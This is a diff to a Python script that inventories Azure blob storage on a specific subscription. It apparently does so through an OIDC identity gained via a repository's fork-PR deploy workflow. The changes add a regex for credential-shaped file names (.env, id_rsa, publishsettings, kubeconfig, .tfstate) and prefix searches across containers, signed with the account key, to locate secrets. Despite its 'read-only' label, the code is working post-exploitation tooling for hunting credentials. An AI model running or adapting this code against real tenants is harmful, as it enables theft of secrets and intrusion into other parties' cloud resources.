@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""C211-I121768: READ-ONLY Azure blob data-plane inventory on subscription b8b18dcf,
+"""C211-I121768 v2: READ-ONLY Azure blob data-plane inventory (sizes + prefix search) on subscription b8b18dcf,
 reached with the SSW.Rules '/deploy' fork-PR OIDC ARM identity.
 
 Creates, modifies and deletes NOTHING. It only:
@@ -54,6 +54,11 @@ CRED_NAME = re.compile(
     r"\.env(\.|$)|credential|secret|password|\.pem$|\.pfx$|\.p12$|id_rsa|id_dsa|"
     r"kubeconfig|\.kube|\.tfstate|terraform|deployment|deploy[-_.]|\.zip$|\.log$|"
     r"\.config$|\.git-credentials|\.netrc|token|sas|connectionstring)", re.I)
+CRED_STRONG = re.compile(
+    r"(publishsettings|pubxml|appsettings|local\.settings|\.env($|\.)|\.pem$|\.pfx$|\.p12$|"
+    r"id_rsa|kubeconfig|\.tfstate|\.netrc|\.git-credentials|"
+    r"(credential|secret|token|password|sas)[\w.-]*\.(json|txt|xml|yaml|yml|config|props|properties)$)",
+    re.I)
 # fetches are restricted to a tighter set: config/credential/archive artifacts only
 FETCH_NAME = re.compile(
     r"(publishsettings|\.pubxml|appsettings[\w.-]*\.json|local\.settings\.json|"
@@ -329,22 +334,26 @@ def phase_storage(tok):
                     if first is None:
                         first = nm
                     last = nm
-                    sz = child_text(be, "Content-Length")
+                    props_el = None
+                    for ch in be:
+                        if ch.tag.endswith("Properties"):
+                            props_el = ch
+                    sz = child_text(props_el, "Content-Length") if props_el is not None else None
                     try:
                         sz = int(sz)
                         size_total += sz
                     except Exception:  # noqa: BLE001
                         sz = None
-                    ctx = child_text(be, "ContentType") or ""
+                    ctx = (child_text(props_el, "ContentType") if props_el is not None else "") or ""
                     ct_set.add(ctx[:60])
                     e = nm.rsplit("/", 1)[-1]
                     e = ("." + e.rsplit(".", 1)[-1].lower()) if "." in e else "(none)"
                     ext[e] = ext.get(e, 0) + 1
-                    lm = child_text(be, "Last-Modified")
+                    lm = child_text(props_el, "Last-Modified") if props_el is not None else None
                     if lm:
                         lm_min = lm if lm_min is None else min(lm_min, lm)
                         lm_max = lm if lm_max is None else max(lm_max, lm)
-                    if CRED_NAME.search(nm) and len(cred) < 80:
+                    if CRED_STRONG.search(nm) and len(cred) < 200:
                         cred.append({"name": nm, "size": sz})
                 nm_el = None
                 try:
@@ -366,6 +375,31 @@ def phase_storage(tok):
                   "first": first, "last": last, "ct": sorted(ct_set)[:6],
                   "lm_min": lm_min, "lm_max": lm_max,
                   "cred_n": len(cred), "cred": cred[:60]})
+            # definitive prefix search for credential-shaped object names
+            pre_hits = []
+            if left() > 100:
+                for pre in ("appsettings", ".env", "publishsettings", "local.settings",
+                            "credentials", "secrets", "secret", "id_rsa", "web.config",
+                            "appsettings.json", "deploy"):
+                    u6 = (blob + f"/{urllib.parse.quote(cn)}?restype=container&comp=list"
+                          f"&prefix={urllib.parse.quote(pre)}&maxresults=1000")
+                    s6, _, raw6 = http(u6, headers=shared_key_headers(acct, key1, "GET", u6),
+                                       timeout=45)
+                    got = []
+                    for be in xml_tags(raw6, "Blob"):
+                        nm6 = child_text(be, "Name")
+                        pr6 = None
+                        for ch in be:
+                            if ch.tag.endswith("Properties"):
+                                pr6 = ch
+                        sz6 = child_text(pr6, "Content-Length") if pr6 is not None else None
+                        if nm6:
+                            got.append({"name": nm6, "size": sz6})
+                    pre_hits.append({"prefix": pre, "http": s6, "n": len(got), "names": got[:12]})
+                    if len(got) and not CRED_STRONG.search(got[0]["name"]):
+                        pass
+            emit({"step": "S1-prefix", "account": acct, "container": cn,
+                  "probes": pre_hits})
             tot["blobs"] += n
             tot["bytes"] += size_total
             tot["cred_names"].extend([x["name"] for x in cred])
@@ -583,7 +617,7 @@ def main():
     emit({"step": "S0-sub", "http": st,
           "displayName": sub.get("displayName") if isinstance(sub, dict) else None,
           "state": sub.get("state") if isinstance(sub, dict) else None})
-    for fn in (phase_storage, phase_web):
+    for fn in (phase_storage,):
         if left() < 60:
             emit({"step": "SKIP", "fn": fn.__name__, "left": int(left())})
             continue
